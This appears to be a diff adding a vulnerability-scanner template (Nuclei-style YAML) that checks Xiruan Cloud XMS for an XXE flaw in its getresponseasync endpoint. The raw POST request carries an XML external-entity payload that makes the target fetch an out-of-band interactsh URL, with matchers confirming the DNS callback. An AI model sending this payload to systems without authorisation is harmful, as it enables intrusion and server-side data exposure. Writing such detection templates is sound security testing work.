@@ -1,0 +1,31 @@
+id: poc-yaml-xi-ruan-yun-getresponseasync-xxe
+info:
+  name: 西软云XMS getresponseasync XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse}}"> %remote;]>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/soap+xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
